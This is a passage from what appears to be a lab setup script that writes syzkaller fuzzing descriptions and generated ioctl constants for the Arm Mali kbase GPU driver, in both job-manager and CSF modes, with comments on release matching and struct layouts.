	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_kinstr_jm_fd {
	count	int16
	padding	array[const[0, int8], 6]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_16__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt" "62e4933cd4cb5a3c55f9f8aeaf896795765a9e7d2bbd8c1f5395ac4a63e4aa7a"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt.const" <<'__PL_17__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_JD_DEP_TYPE_DATA = 1
BASE_JD_DEP_TYPE_INVALID = 0
BASE_JD_DEP_TYPE_ORDER = 2
BASE_JD_PRIO_HIGH = 1
BASE_JD_PRIO_LOW = 2
BASE_JD_PRIO_MEDIUM = 0
BASE_JD_REQ_CF = 8
BASE_JD_REQ_COHERENT_GROUP = 64
BASE_JD_REQ_CS = 2
BASE_JD_REQ_DEP = 0
BASE_JD_REQ_END_RENDERPASS = 524288
BASE_JD_REQ_EVENT_COALESCE = 32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = 4096
BASE_JD_REQ_EXTERNAL_RESOURCES = 256
BASE_JD_REQ_FS = 1
BASE_JD_REQ_FS_AFBC = 8192
BASE_JD_REQ_JOB_SLOT = 131072
BASE_JD_REQ_ONLY_COMPUTE = 1024
BASE_JD_REQ_PERMON = 128
BASE_JD_REQ_SKIP_CACHE_END = 65536
BASE_JD_REQ_SKIP_CACHE_START = 32768
BASE_JD_REQ_SOFT_JOB = 512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = 2048
BASE_JD_REQ_START_RENDERPASS = 262144
BASE_JD_REQ_T = 4
BASE_JD_REQ_V = 16
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FLAG_MAP_FIXED = 134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_19 = 524288
BASE_MEM_RESERVED_BIT_8 = 256
BASE_MEM_SAME_VA = 8192
BASE_MEM_TILER_ALIGN_TOP = 1048576
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_JOB_SUBMIT = 1074823170
KBASE_IOCTL_KINSTR_JM_FD = 3221782579
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = 1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = 1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_POST_TERM = 32772
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_SOFT_EVENT_UPDATE = 1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520436
KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_17__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0.txt.const" "d0bc62f316164c4a4d7c681172e8dcc5594c57deef4744a640e443bb09971611"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt" <<'__PL_18__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI — CSF MODE.
#
# RELEASE-MATCHED to: r36p0-01eac0 Bifrost/Valhall DDK built with
# CONFIG_MALI_CSF_SUPPORT=y (MALI_USE_CSF=1) — the companion description to
# dev_mali_r36p0.txt, selected by the bootstrap's MALI_MODE knob
# (MALI_MODE=csf activates this file; MALI_MODE=jm, the default, activates
# dev_mali_r36p0.txt). Only one of the two may be active in sys/linux at a
# time (activate_desc enforces it).
#
# Provenance & verification:
# - Derived from dev_mali_r36p0.txt (itself field-for-field from dev_mali_
#   r41p0.txt) against the same pristine release headers under
#   harness/release_uapi/r36p0 (csf/ subtree drives the CS_* models).
# - Dispatch cross-check against r36p0 mali_kbase_core_linux.c: common cases
#   run in both modes; this file adds the #if MALI_USE_CSF-only cases
#   (MEM_ALLOC_EX + CS_QUEUE_*/CS_GROUP via _1_6 and nr58, CS_EVENT_SIGNAL,
#   KCPU_QUEUE_*, CS_TILER_HEAP_*, CS_GET_GLB_IFACE, CS_CPU_QUEUE_DUMP) and
#   drops the #if !MALI_USE_CSF-only cases (JOB_SUBMIT, POST_TERM,
#   SOFT_EVENT_UPDATE, KINSTR_JM_FD) plus their structs/flag lists.
# - KCPU_QUEUE_ENQUEUE: r36p0's kbase_csf_kcpu_queue_enqueue rejects
#   nr_commands != 1 (mali_kbase_csf_kcpu.c:1961), so nr_commands is const[1]
#   and addr points at ONE struct base_kcpu_command (24B: type + 7 pad +
#   16B info union — modeled opaque; the fuzzed `type` selects the handler).
# - C unions are modeled as the in-view (out-view bytes aliased over the
#   same buffer, ignored unless they carry a gpu_addr resource — see the
#   per-struct comments). Sizes gated by layout_check_r36p0.c (CSF asserts).
# - Excluded (documented): CINSTR_GWT_* (CONFIG_MALI_CINSTR_GWT unset),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST),
#   legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (absent pre-r36p0),
#   EVENT_MEMORY_WRITE/READ (MALI_UNIT_TEST), JM-only ioctls listed above.
#
# Extraction needs MALI_USE_CSF visible before the first mali header, hence
# the leading <mali_use_csf.h> include: it resolves from
# harness/release_uapi/mode-csf (one #define) — the bootstrap's extract_consts
# passes that dir first in -includedirs for this description. Recipe:
#   bin/syz-extract -arch amd64,arm64 -sourcedir <hardlink mirror of $KT with
#       the uapi/gpu shadow dropped> -includedirs \
#       harness/release_uapi/mode-csf,harness/release_uapi/r36p0 \
#       dev_mali_r36p0_csf.txt
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <mali_use_csf.h>
include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/csf/mali_base_csf_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
# r36p0-only legacy JIT family on the SAME nr 14 (8B + 16B; distinguished by
# _IOC_SIZE, same pattern Phase F5 modeled for r28p0) — removed in r41p0.
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# --- CSF mode surface (MALI_USE_CSF=1 dispatch cases in r36p0
# mali_kbase_core_linux.c; struct sizes vs release headers listed inline).
ioctl$KBASE_IOCTL_MEM_ALLOC_EX(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC_EX], arg ptr[in, kbase_ioctl_mem_alloc_ex])
ioctl$KBASE_IOCTL_CS_QUEUE_REGISTER(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_REGISTER], arg ptr[in, kbase_ioctl_cs_queue_register])
ioctl$KBASE_IOCTL_CS_QUEUE_KICK(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_KICK], arg ptr[in, kbase_ioctl_cs_queue_kick])
ioctl$KBASE_IOCTL_CS_QUEUE_BIND(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_BIND], arg ptr[in, kbase_ioctl_cs_queue_bind])
ioctl$KBASE_IOCTL_CS_QUEUE_REGISTER_EX(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_REGISTER_EX], arg ptr[in, kbase_ioctl_cs_queue_register_ex])
ioctl$KBASE_IOCTL_CS_QUEUE_TERMINATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_TERMINATE], arg ptr[in, kbase_ioctl_cs_queue_terminate])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6], arg ptr[in, kbase_ioctl_cs_queue_group_create_1_6])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_CREATE], arg ptr[in, kbase_ioctl_cs_queue_group_create])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE], arg ptr[in, kbase_ioctl_cs_queue_group_term])
ioctl$KBASE_IOCTL_CS_EVENT_SIGNAL(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_EVENT_SIGNAL], arg const[0])
ioctl$KBASE_IOCTL_KCPU_QUEUE_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_CREATE], arg ptr[out, kbase_ioctl_kcpu_queue_new])
ioctl$KBASE_IOCTL_KCPU_QUEUE_DELETE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_DELETE], arg ptr[in, kbase_ioctl_kcpu_queue_delete])
ioctl$KBASE_IOCTL_KCPU_QUEUE_ENQUEUE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_ENQUEUE], arg ptr[in, kbase_ioctl_kcpu_queue_enqueue])
ioctl$KBASE_IOCTL_CS_TILER_HEAP_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_TILER_HEAP_INIT], arg ptr[in, kbase_ioctl_cs_tiler_heap_init])
ioctl$KBASE_IOCTL_CS_TILER_HEAP_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_TILER_HEAP_TERM], arg ptr[in, kbase_ioctl_cs_tiler_heap_term])
ioctl$KBASE_IOCTL_CS_GET_GLB_IFACE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_GET_GLB_IFACE], arg ptr[in, kbase_ioctl_cs_get_glb_iface])
ioctl$KBASE_IOCTL_CS_CPU_QUEUE_DUMP(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_CPU_QUEUE_DUMP], arg ptr[in, kbase_ioctl_cs_cpu_queue_info])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
